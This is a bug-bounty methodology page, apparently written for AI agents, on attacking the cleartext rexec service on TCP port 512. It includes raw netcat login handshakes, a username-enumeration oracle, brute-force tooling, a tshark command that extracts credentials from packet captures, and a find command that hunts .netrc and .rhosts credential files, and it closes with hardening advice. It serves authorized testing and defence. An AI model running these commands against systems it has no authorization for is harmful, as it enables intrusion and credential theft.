---
technology: "rexec (BSD r-services)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
layer: "Legacy remote execution (TCP 512 exec; cleartext username/password protocol; GNU inetutils rexec/rexecd lineage)"
status: "upstream-only — bucket-2 new-unit, zero corpus evidence by design"
ht-source:
  - "rewritten from HackTricks (src/network-services-pentesting/512-pentesting-rexec.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "upstream-only: rewritten from HackTricks per the third-party-reference rule; protocol wire format, 16-byte field limits, and the distinct-diagnostics enumeration oracle verified against the GNU Inetutils rexecd manual; the metasploit module path verified against the Rapid7 module database (auxiliary/scanner/rservices/rexec_login). hydra/medusa module availability asserted with a check-your-build caveat only. Zero corpus evidence by design (new-unit wave 3, 2026-11-13)."
---

# rexec (512/tcp)

Target model: the password-authenticated member of the Berkeley
r-services family — remote command execution over a trivial
cleartext protocol, TCP port 512 (`exec`). Unlike its siblings
([[r-services-rlogin|rlogin/rsh trust abuse]]), rexec takes a username
and password, and both cross the wire **unencrypted** along with the
command. It survives on legacy Unix estates and embedded/industrial
equipment where an inetd superserver still has the service line
uncommented — typically beside 513/514 (scan all three together) and in
environments that never finished their [[ssh]] migration. Enumeration
sibling: [[r-services-rusersd|rusersd]] for the usernames to try here.

## Wire format (know it and you need no tool)

Per the GNU inetutils rexecd protocol:

1. Client connects; sends a NUL-terminated ASCII decimal string — the
   port for a secondary stderr channel, `0` for none.
2. NUL-terminated **username** (max 16 bytes).
3. NUL-terminated **password** (max 16 bytes, unencrypted).
4. NUL-terminated **command** handed to the user's login shell.
5. Server returns a NUL byte on success; on failure a byte value `1`
   precedes a diagnostic message on the initial connection.

If the first field is non-zero, the server opens a **second TCP
connection back to the client** for stderr — a callback you can use for
manual testing and as a firewall/filtering fingerprint.

Raw reproduction:

```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc 198.51.100.10 512
```

Ask for stderr on your own listener instead:

```bash
nc -lvnp 4444
printf '4444\0user\0password\0id; uname -a\0' | nc 198.51.100.10 512
```

Valid credentials return the command output on the same connection.

The 16-byte username/password ceilings are protocol facts worth
remembering: they cap password entropy hard, and any deployment
"secured" with a long password is silently truncated-era.

## Username enumeration before brute force

The GNU manual itself documents the oracle: `Login incorrect.` means no
such user; `Password incorrect.` means the user exists. Probe the
difference with the raw handshake before spending guess budget:

```bash
printf '0\0root\0wrongpass\0id\0' | nc -w 2 198.51.100.10 512 | tail -c +2
printf '0\0definitelynotreal\0wrongpass\0id\0' | nc -w 2 198.51.100.10 512 | tail -c +2
```

Distinguishable replies → build the valid-user list first, then
password-spray only those accounts.

## Client and credential attacks

The packaged client (`rexec`, in inetutils-rexec / rsh-client):

```bash
rexec -l user -p password 198.51.100.10 "uname -a"
printf '%s\n' 'password' | rexec -l user -p - 198.51.100.10 "id"   # password via stdin, keeps it off the process list
```

(Reading the password from stdin protects your local shell history
only — the wire is still cleartext.)

Online guessing: metasploit's `auxiliary/scanner/rservices/rexec_login`
(USER_FILE/PASS_FILE options) validates pairs and stores them in the
workspace. hydra and medusa both ship rexec support in common builds —
confirm the module exists in *your* build (`medusa -d`, hydra module
list) before planning a run around it. As with every online directory
attack: conservative concurrency, respect lockout.

## Capture beats guessing

Because authentication and commands are cleartext, a capture position
(authorized monitoring point, SPAN, PCAP from incident response) yields
credentials with **zero** packets sent at the target:

```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e tcp.payload \
  | tr ':' ' ' | xxd -r -p | tr '\0' ':' | head
```

(or follow the TCP stream and split on NULs by eye — field order is
port:user:password:command). In Wireshark, Decode-As TCP 512 → REXEC
parses the fields for you.

## Post-exploitation notes

- Commands run as the authenticated user via their **login shell** —
  shell metacharacters chain normally, so a valid low-priv account with
  `/bin/sh` is direct code execution in that user's context.
- Where the daemon was built with PAM, the policy actually enforced is
  whatever `/etc/pam.d/rexec` says — read it; a permissive stack
  (e.g. `pam_permit` or weak modules) changes what "valid credentials"
  means.
- Hunt reusable material on any host you land on adjacent to this
  estate: `~/.netrc` files, automation scripts, and config blobs with
  embedded rexec credentials:
  ```bash
  find / -xdev \( -name .netrc -o -name netrc -o -iname '*rexec*' -o -path '*/.rhosts' \) 2>/dev/null
  ```

## Hardening (report shape)

Disable the service — every modern inetd ships it commented out for a
reason; replace with [[ssh]]. Interim: TCP wrappers/firewall allowlists
per source, strong per-account passwords, monitoring on traffic to 512
(a single PCAP detects misuse), and treat 512/513/514 as one finding —
they share codebase, era, and weak model.
